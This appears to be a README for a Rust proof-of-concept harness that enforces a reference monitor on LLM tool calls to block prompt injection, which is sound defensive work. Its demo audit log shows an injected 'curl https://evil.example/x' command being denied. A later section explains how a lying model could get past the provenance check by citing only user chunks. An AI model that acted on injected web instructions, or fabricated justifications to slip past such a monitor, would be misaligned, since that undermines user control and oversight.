# anderson

> A minimal LLM-agent harness built on the reference-monitor principles from
> James P. Anderson's *Computer Security Technology Planning Study* (1972).

[![CI status badge placeholder]()][gh-actions]

[gh-actions]: https://github.com/evalops/anderson/actions

The 1972 [Anderson Report] is the founding document of computer security. It
introduced the "malicious user" threat model, the reference monitor concept,
and the three properties any access control mechanism must satisfy
(tamper-proof, always-invoked, small-enough-to-verify). Forty-four years
later, the LLM-agent ecosystem is busy re-discovering those principles by
shipping prompt-injected agents and patching individual exploit payloads.

This crate is a small, runnable proof that the 1972 architecture maps cleanly
onto LLM tool-use, and that the central security claim — *the harness, not
the model, decides what executes* — can be enforced structurally rather than
hoped for.

[Anderson Report]: https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf

## What the POC demonstrates

```text
$ cargo run --example injection
ANSWER: I read the page; it tried to instruct me to run a curl command,
        which the monitor refused. Reporting that here instead of executing it.

Audit log:
  NetGet { url: "https://example.com/notes" }  cited=[0]  → ALLOW
  Exec   { cmd: "curl https://evil.example/x" } cited=[1] → DENY: Exec requires
      every cited chunk to carry user authority; chunk(s) [1] are untrusted as intent
```

A prompt-injected model honestly proposes the dangerous action a hostile
webpage asked for. The reference monitor refuses because the cited
justification chunk is `WEB`-provenance, not `USER`-provenance. The model
then revises its plan and stops cleanly. The denial — and the model's
attempt — is recorded in the audit log.

The architectural claim: this works *whatever model you wire in*. The
demonstration runs a scripted model so it is reproducible without an API key.
The same harness with `OpenAiModel` enforces the same property against a real
LLM doing real tool calling — see `examples/openai_chat.rs`.

## Why a reference monitor?

Anderson §3.2.2 specifies three properties any access-control mechanism must
satisfy:

> (a) The reference validation mechanism must be **tamper proof**.
> (b) The reference validation mechanism must **always be invoked**.
> (c) The reference validation mechanism must be **small enough to be subject
>     to analysis and tests, the completeness of which can be assured**.

For an LLM agent, the analog is one-to-one:

- **Tamper-proof** — the monitor is code, not prompts. The model cannot edit
  policy, override capabilities, or argue its way past a denial.
- **Always invoked** — every tool call routes through the monitor. There is
  no fast path, no in-process tool that bypasses the gate, no "trusted" model
  state that skips the check.
- **Small enough to verify** — the security kernel of this harness is **270
  lines** of Rust across three files: [`monitor.rs`](src/monitor.rs),
  [`capability.rs`](src/capability.rs), [`provenance.rs`](src/provenance.rs).
  Read them.

## Architecture

```text
USER ──(request + capability bundle)──▶ ORCHESTRATOR
                                            │
                                            ▼
                                builds context with PROVENANCE TAGS
                                            │
                                            ▼
                                       MODEL
                                  (ScriptedModel
                                   or OpenAiModel)
                                            │
                                            ▼
                                emits STRUCTURED ToolCall
                                            │
                                            ▼
                          ┌─────────────────────────────────┐
                          │           MONITOR               │  ◄── the security
                          │   capability check              │      kernel; ~270 LoC
                          │   provenance check              │      no model
                          │   spend check                   │      influence
                          │   confirmation check            │
                          └────────────────┬────────────────┘
                                           │
                                Decision   │
                  ┌────────────────────────┼────────────────────────┐
                  │                        │                        │
                Allow                    Deny                    Escalate
                  │                        │                        │
                  ▼                        ▼                        ▼
        SANDBOXED EXECUTOR        notify model;            halt (POC);
        (subprocess sandbox,      append SYSTEM            real harness
         clearing env, timeout,   chunk; loop              prompts human
         byte cap, canonical
         path re-check)
                  │
                  ▼
        result tagged with provenance,
        appended to context, model notified
                  │
                  ▼
              audit log
```

## Principle → code map

| Anderson principle                             | Where it lives in this crate                                                                                        |
| ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| Reference monitor: small / tamper-proof / always-invoked | [`src/monitor.rs`](src/monitor.rs) — 218 lines, no runtime-configurable policy, called from the single orchestrator loop |
| Capability bundle as least-authority grant     | [`src/capability.rs`](src/capability.rs) — allow-lists for FS, network, exec; hard limits on calls/steps/wall-clock/byte-caps |
| Authentication of intent (§3.7 analog)         | [`src/provenance.rs`](src/provenance.rs) — every context chunk tagged with its source; `carries_user_authority()` is the trust predicate |
| Tools in their own protection domain (§3.5)    | [`src/tools.rs`](src/tools.rs) — `SandboxedExecutor` uses `sandbox-exec` on macOS / `bwrap` on Linux for `exec`; fails closed elsewhere |
| Path canonicalisation defence                  | [`src/tools.rs`](src/tools.rs) — `tokio::fs::canonicalize` then re-check against bundle before any read or write |
| Append-only audit log (§3.3)                   | [`src/audit.rs`](src/audit.rs) — every decision recorded; JSONL serialisable                                        |
| Mediated recovery from denials                 | [`src/orchestrator.rs`](src/orchestrator.rs) — denials are surfaced back to the model so it can revise its plan     |
| OpenAI native tool calling                     | [`src/openai.rs`](src/openai.rs) — stateful message history, tool-call IDs preserved across turns                   |

## The structural prompt-injection defence

The monitor's "provenance check" — for action classes flagged
`require_user_intent`, **every** cited justification chunk must carry user
or system authority — is the load-bearing security property of this design.

### Why every-not-any

A weaker version of this check (at least one cited chunk must be user-authority)
is trivially defeated by a model that always includes some user chunk in its
citations. The stricter every-must-be-user variant forces the model into a
bind:

- If the model honestly cites the web chunk that drove its decision, the
  monitor sees it and denies.
- If the model omits the web chunk to pass the check, it is on the record
  hiding its actual justification — visible in the audit log.

The honest model that does not act on web-provenance intent succeeds. The
prompt-injected model that does is structurally prevented from doing so.

### What this does *not* solve

A sufficiently sophisticated lying model could cite only user chunks even
when its real motivation came from a web page. The cited user chunks might
not actually contain any request relevant to the proposed action. The audit
log would show this, but the action would have already executed.

Defence in depth: a separate "intent verifier" pass — a second LLM call asked
"does cited chunk #X actually request action Y?" — closes this gap and is
listed under [future work](#future-work).

## What this POC includes

- **Reference monitor** with the three Anderson properties (`src/monitor.rs`).
- **Capability bundles** with FS allow-lists, network allow-lists, exec
  allow-lists, and hard ceilings on: tool calls, model steps, wall-clock
  seconds, consecutive denials, response bytes (`src/capability.rs`).
- **Provenance tagging** on every context chunk, with a binary trust predicate
  (`src/provenance.rs`).
- **Sandboxed tool executor**:
  - `exec` runs inside `sandbox-exec` (macOS) or `bwrap` (Linux) with cleared
    environment, wall-clock timeout, stdout byte cap. Fails closed on other
    platforms.
  - `net_get` via `reqwest` with timeout and a hard byte cap.
  - `fs_read` / `fs_write` canonicalise the path then re-check it against the
    bundle (TOCTOU/symlink defence). Output is byte-capped.
- **Orchestrator** that bounds wall-clock, steps, and consecutive denials
  independently; surfaces denials back to the model so it can recover
  (`src/orchestrator.rs`).
- **Append-only audit log**, JSONL-serialisable (`src/audit.rs`).
- **Scripted model** for deterministic, offline tests (`src/model.rs`).
- **Real OpenAI integration** using OpenAI's native tool-calling protocol,
  stateful message history, and proper `tool_call_id` linkage
  (`src/openai.rs` via [`async-openai`]).
- **Integration tests** asserting the security invariants
  (`tests/security_invariants.rs`).

[`async-openai`]: https://github.com/64bit/async-openai

## What this POC deliberately does *not* include

These are real production gaps. Each is a known piece of work, not a bug.

- **Subprocess sandboxing only on macOS/Linux.** Windows fails closed. A
  production harness would also use seccomp-bpf directly on Linux for finer
  control and microVMs (Firecracker, gVisor) for genuine isolation.
- **No signed model weights or signed tool catalog.** Anderson §4.3.1 warned
  about installations accepting OS updates "without question"; weight files,
  system prompts, and MCP server endpoints are the modern analog. A
  production harness would hash-pin and signature-verify all three.
- **No semantic intent verifier.** The provenance check is necessary but not
  sufficient; see [The structural prompt-injection defence](#the-structural-prompt-injection-defence)
  above.
- **No streaming.** OpenAI responses are awaited as a whole.
- **No persistent state across sessions.** A real agent harness needs a
  managed memory layer; this POC has none.
- **Escalation halts the session.** A real harness would pause for human
  input on the specific call rather than aborting the session.
- **Single-tool-call-per-turn.** If the model returns multiple tool calls in
  one assistant message, only the first is processed; the rest receive an
  "ignored" tool result. The system prompt asks for one at a time.

## Running

### Prerequisites

- Rust 1.75+ (uses 2021 edition; `rustc --version` should show ≥ 1.75).
- For sandboxed `exec`: macOS (ships `sandbox-exec`) or Linux with `bwrap`
  installed at `/usr/bin/bwrap`. Other platforms fail closed on `exec`.

### Demos (no API key required)

```sh
# Benign session: agent reads /etc/hosts on the user's request.
cargo run --example benign

# Prompt-injection demo: hostile webpage tries to escalate; monitor blocks;
# model recovers; session completes.
cargo run --example injection
```

### Live OpenAI session

```sh
export OPENAI_API_KEY=sk-...
# Optional, defaults to gpt-4o-mini:
export ANDERSON_MODEL=gpt-4o-mini

cargo run --example openai_chat -- "What's in /etc/hosts?"
```

The session's capability bundle permits only `fs_read` on `/etc/hosts`. Try
asking the model to read `/etc/passwd` instead and watch the monitor refuse,
the model see the denial in its tool message history, and the model recover.

### CLI

```sh
cargo run -- benign
cargo run -- injection
cargo run -- openai -- "your prompt here"
cargo run -- openai --model gpt-4o "your prompt"
```

### Tests

```sh
cargo test
```

Eight tests run by default — four unit, four integration. The integration
tests in `tests/security_invariants.rs` are the load-bearing security claims
of this project asserted as executable expectations.

## Threat model

**Defended:**

- Prompt injection from untrusted content (web pages, retrieved documents,
  file contents) inducing the model to propose dangerous actions on the
  user's behalf.
- Exhaustion attacks (model loops, denial loops, runaway tool calls).
- TOCTOU/symlink escape from the FS allow-list.
- Unrestricted exec privilege (sandbox + cleared env + timeout + byte cap).
- Unrestricted network egress (allow-list + timeout + byte cap).

**Not defended:**

- A sufficiently sophisticated lying model that fabricates justifications.
  (Semantic intent verifier needed; see future work.)
- Compromise of the model weights, system prompt, or tool catalog. (Supply
  chain pinning needed.)
- Side channels (cache timing, token-count signals to a colluding tool).
- The platform sandbox itself failing. (`sandbox-exec` has known limitations;
  `bwrap` requires careful configuration.)
- Physical access, host OS compromise, or hardware-level attacks.

## Future work

- **Semantic intent verifier.** A second LLM pass asked to evaluate whether
  cited user chunks actually request the proposed action, before allowing it.
- **Supply chain pinning.** Hash-pin model versions, sign tool catalogs, sign
  the system prompt, authenticate MCP server endpoints.
- **Per-call credential issuance.** Tools receive short-lived scoped tokens
  derived from the capability bundle rather than ambient credentials.
- **Streaming.** Allow incremental processing of model responses.
- **Multi-call-per-turn.** Process every tool call in an assistant message
  in parallel, with per-call provenance attribution.
- **Linux: native seccomp-bpf.** Replace the `bwrap` shim with a Rust
  seccomp policy applied via `prctl` in `pre_exec` for finer control.
- **Microvm executor.** For high-risk environments, run `exec` inside a
  Firecracker microvm with no network and a tmpfs root.

## License

Dual-licensed under either of:

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
- MIT License ([LICENSE-MIT](LICENSE-MIT))

at your option.

## Acknowledgements

The intellectual debt to James P. Anderson and the 1972 panel — E. L. Glaser,
Roger Schell, Steven Lipner, Daniel Edwards, Hilda Faust, Eldred Nelson,
Bruce Peters, Charles Rose, Clark Weissman, Melvin Conway — is in every
module of this crate. Read the original [report]; the LLM-agent translation
writes itself.

[report]: https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72.pdf
